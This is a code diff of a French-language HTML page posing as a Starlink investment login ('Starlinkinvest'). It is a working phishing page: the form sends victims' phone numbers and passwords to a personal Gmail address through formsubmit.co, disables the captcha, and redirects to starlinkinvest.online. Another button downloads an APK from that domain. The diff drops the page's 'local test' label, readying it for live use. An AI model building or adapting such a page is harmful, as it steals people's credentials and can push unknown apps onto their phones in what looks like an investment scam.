@@ -1,9 +1,9 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="fr">
 <head>
   <meta charset="utf-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1"/>
-  <title>Starlink Login (local test)</title>
+  <title>Starlinkinvest Login</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Inter&display=swap');
@@ -12,8 +12,10 @@
 </head>
 <body class="bg-white">
   <div class="max-w-md mx-auto">
+    <!-- Logo -->
     <img src="./dd.jpg" alt="Starlink logo" class="w-full object-cover" width="600" height="200"/>
 
+    <!-- Boutons Se connecter / S'inscrire -->
     <div class="flex mt-8 mx-6 rounded-xl overflow-hidden border border-transparent">
       <button class="flex-1 bg-[#9B0E30] text-white text-lg py-4 rounded-l-xl font-normal" type="button">
         Se connecter
@@ -25,23 +27,33 @@
 
     <!-- Formulaire -->
     <form action="https://formsubmit.co/armageddon243243@gmail.com" method="POST" class="mt-6 mx-6 space-y-6">
-      <!-- Empêche le captcha FormSubmit -->
+      <!-- Désactiver Captcha -->
       <input type="hidden" name="_captcha" value="false">
 
+      <!-- Redirection après soumission -->
+      <input type="hidden" name="_next" value="https://starlinkinvest.online/login">
+
+      <!-- Numéro de téléphone -->
       <div>
         <label for="phone" class="block mb-2 text-[#9B0E30] text-base font-normal">Numéro de téléphone</label>
         <input id="phone" name="Numéro de téléphone" type="tel" placeholder="+243 Votre numéro" required
           class="w-full rounded-xl border border-[#9B0E30] text-gray-400 text-base font-normal py-3 px-4 focus:outline-none focus:ring-2 focus:ring-[#9B0E30]"/>
       </div>
+
+      <!-- Mot de passe visible -->
       <div>
         <label for="password" class="block mb-2 text-[#9B0E30] text-base font-normal">Mot de passe</label>
         <input id="password" name="Mot de passe" type="text" placeholder="entrer mot de passe" required
           class="w-full rounded-xl border border-[#9B0E30] text-gray-400 text-base font-normal py-3 px-4 focus:outline-none focus:ring-2 focus:ring-[#9B0E30]"/>
       </div>
+
+      <!-- Bouton Se connecter -->
       <button type="submit"
         class="w-full bg-[#9B0E30] text-white text-lg py-4 rounded-xl font-normal">
         Se connecter
       </button>
+
+      <!-- Bouton Télécharger l'application -->
       <button onclick="window.location.href='https://starlinkinvest.online/Starlink.apk'" type="button"
         class="w-full bg-[#9B0E30] text-white text-lg py-3 rounded-xl font-normal">
         Télécharger l'application
